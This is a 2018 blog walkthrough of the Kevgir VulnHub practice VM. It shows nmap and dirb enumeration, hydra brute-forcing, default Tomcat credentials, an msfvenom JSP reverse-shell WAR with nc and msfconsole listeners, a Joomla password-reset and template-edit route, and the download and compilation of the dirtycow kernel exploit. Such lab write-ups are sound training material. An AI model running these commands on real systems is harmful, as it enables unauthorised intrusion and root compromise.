---
layout: post
title:  "Kevgir: Vulnhub Walkthrough"
date:   2018-01-01 15:07:19
categories: [tutorial]
comments: true
---
This is a boot2root machine hosted on [VulnHub][1] that was created by [CanYouPwn.Me][2] and is part of a series called `Kevgir`. Word from the author:
```
Kevgir has designed by canyoupwnme team for training, hacking practices and exploiting.
Kevgir has lots of vulnerable services and web applications for testing.
We are happy to announced that.

Have fun!

Default username:pass => user:resu

Bruteforce Attacks
Web Application Vulnerabilities
Hacking with Redis
Hacking with Tomcat, Jenkins
Hacking with Misconfigurations
Hacking with CMS Exploits
Local Privilege Escalation
And other vulnerabilities.
```

<!--more-->
## Information Gathering
We'll start with an nmap `scan`:

```
root@marksmith:~# nmap -A -T4 -p- 192.168.175.135

Starting Nmap 7.40 ( https://nmap.org ) at 2017-09-21 16:33 EDT
Nmap scan report for 192.168.175.135
Host is up (0.00031s latency).
Not shown: 65517 closed ports
PORT      STATE SERVICE     VERSION
25/tcp    open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Kevgir VM
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      41707/tcp  mountd
|   100005  1,2,3      58790/udp  mountd
|   100021  1,3,4      38993/udp  nlockmgr
|   100021  1,3,4      39991/tcp  nlockmgr
|   100024  1          35893/tcp  status
|   100024  1          60075/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
|_  256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
6379/tcp  open  redis       Redis key-value store
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Joomla! 1.5 - Open Source Content Management
| http-robots.txt: 14 disallowed entries
| /administrator/ /cache/ /components/ /images/
| /includes/ /installation/ /language/ /libraries/ /media/
|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to the Frontpage
9000/tcp  open  http        Jetty winstone-2.9
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(winstone-2.9)
|_http-title: Dashboard [Jenkins]
35871/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
| ssh-hostkey:
|_  2048 97:bb:2c:13:54:2f:88:0d:00:c6:80:24:30:d6:29:54 (RSA)
35893/tcp open  status      1 (RPC #100024)
37685/tcp open  mountd      1-3 (RPC #100005)
39991/tcp open  nlockmgr    1-4 (RPC #100021)
41707/tcp open  mountd      1-3 (RPC #100005)
51940/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequest:
|     Unrecognized protocol:
|   DNSVersionBindReq:
|     Unrecognized protocol:
|     version
|_    bind
58853/tcp open  mountd      1-3 (RPC #100005)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port51940-TCP:V=7.40%I=7%D=9/21%Time=59C42236%P=x86_64-pc-linux-gnu%r(D
SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
MAC Address: 00:0C:29:74:7A:29 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.6
Network Distance: 1 hop
Service Info: Host: CANYOUPWNME; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4d15h32m10s, deviation: 0s, median: 4d15h32m10s
|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: canyoupwnme
|   NetBIOS computer name: CANYOUPWNME\x00
|   Domain name:
|   FQDN: canyoupwnme
|_  System time: 2017-09-26T15:07:36+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

```
Just a spoiler there are several ways to get a shell on this box. I'll show you below. There are several http ports open.
We shall enumerate all of them http ports using dirb.
```
# dirb http://192.168.175.135
```

This doesn't give much

## Low privilege shell Method One: Tomcat

Navigating to http://192.168.175.135:8080 shows that its running a tomcat server. We'll bruteforce for any hidden directories or simply try `/manager` as its common on tomcat


```
# dirb http://192.168.175.135:8080
...
URL_BASE: http://192.168.175.135:8080/
---- Scanning URL: http://192.168.175.135:8080/ ----
==> DIRECTORY: http://192.168.175.135:8080/docs/
==> DIRECTORY: http://192.168.175.135:8080/examples/
==> DIRECTORY: http://192.168.175.135:8080/host-manager/
+ http://192.168.175.135:8080/index.html (CODE:200|SIZE:1895)
==> DIRECTORY: http://192.168.175.135:8080/manager/
==> DIRECTORY: http://192.168.175.135:8080/META-INF/
...
```
... and what do you know
Going to the manager link
`http://192.168.175.135:8080/manager`
asks for a password. We do have a file that has a passwords for Tomcat servers. We try some default passwords. If not we can try to brute-force using hydra;

```
# hydra -L /root/vulnhub/stapler/realusers -P /root/vulnhub/stapler/realusers -e nsr -t 10 192.168.109.141 ssh

```

We'll use
username: tomcat
password:tomcat

and we're in.
### Insert image here.

Now we know tomcat runs java hence jsp hence we'll use this to generate a payload;
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.227.135 LPORT=80 -f war > rs.war
```
On the attackers box we can either use msfconsole or nc as follows

### Start a listener in msfconsole
```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.11.0.250; set LPORT 80; set ExitOnSession false; exploit -j"
```
### Start a nc listener
```
nc -lnvp 80
```
## Method Two: Joomla

We'll follow the same drill. Port 8081 is running Joomla, hence we'll bruteforce for any hidden directories.
dirb http://192.168.175.135:8081
```
URL_BASE: http://192.168.175.135:8081/
---- Scanning URL: http://192.168.175.135:8081/ ----
==> DIRECTORY: http://192.168.175.135:8081/administrator/
==> DIRECTORY: http://192.168.175.135:8081/cache/
+ http://192.168.175.135:8081/cgi-bin/ (CODE:403|SIZE:292)
==> DIRECTORY: http://192.168.175.135:8081/components/
==> DIRECTORY: http://192.168.175.135:8081/images/
==> DIRECTORY: http://192.168.175.135:8081/includes/
+ http://192.168.175.135:8081/index.php (CODE:200|SIZE:4047)
==> DIRECTORY: http://192.168.175.135:8081/javascript/
==> DIRECTORY: http://192.168.175.135:8081/language/
==> DIRECTORY: http://192.168.175.135:8081/libraries/
==> DIRECTORY: http://192.168.175.135:8081/logs/
==> DIRECTORY: http://192.168.175.135:8081/media/
==> DIRECTORY: http://192.168.175.135:8081/modules/
==> DIRECTORY: http://192.168.175.135:8081/phpmyadmin/
==> DIRECTORY: http://192.168.175.135:8081/plugins/
+ http://192.168.175.135:8081/robots.txt (CODE:200|SIZE:304)
+ http://192.168.175.135:8081/server-status (CODE:403|SIZE:297)
==> DIRECTORY: http://192.168.175.135:8081/templates/
==> DIRECTORY: http://192.168.175.135:8081/tmp/
==> DIRECTORY: http://192.168.175.135:8081/xmlrpc/

```
Another thing we can do is use Joomscan to further enumerate
`joomscan -u http://192.168.175.135:8081`

### iNSERT image
Reading through the log we find that `#15` holds something useful. A  vulnerability exists that allows users to change admin password;

### Insert image

We reset the password and log in;

Once we in as admin. We look for a php file we can edit. To do this;
1. go to Extensions
2. Template Manager
3. Selec the active template
4. Edit the template and save changers.

Once this is done we can execute commands through  the browser.
As usual we'll use Burp to intercept and execute the payload;

## Other interests
This box is also running `Samba` and we can see from the smb enum script, we can Read/Write into the $IPC Service

```
Host script results:                                                      
| smb-enum-shares:                                                   
|   account_used: guest                                                   
|   IPC$:                                                                 
|     Type: STYPE_IPC_HIDDEN                                              
|     Comment: IPC Service (canyoupwnme server (Samba, Ubuntu))           
|     Users: 1                                                            
|     Max Users: <unlimited>                                              
|     Path: C:\tmp                                                        
|     Anonymous access: READ/WRITE                                        
|     Current user access: READ/WRITE


```

## Post Exploitation

```
uname -a
Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
```
From this kernel version we can attempt a kernel exploit.
It may crash the system but we'll still try it.
We'll attempt to use the dirtycow exploit.
####Add link to dirtycow
```
wget http://192.168.175.132:1234/cowroot.c -O /tmp/cowroot.c
Edit it for either 32bit or 64bit.


python -c "import pty; pty.spawn('/bin/bash');"
gcc -pthread cowroot.c -o cowroot && chmod 744 cowroot && ./cowroot asdf
Once you get a shell enter the following command. chap chap
echo 0 > /proc/sys/vm/dirty_writeback_centisecs

```
Other way is to use the suid bit set.

[1]: https://www.vulnhub.com/entry/kevgir-1,137/
[2]: https://twitter.com/@canyoupwnme
[3]: https://www.vulnhub.com/
[4]: https://github.com/21y4d/nmapAutomator
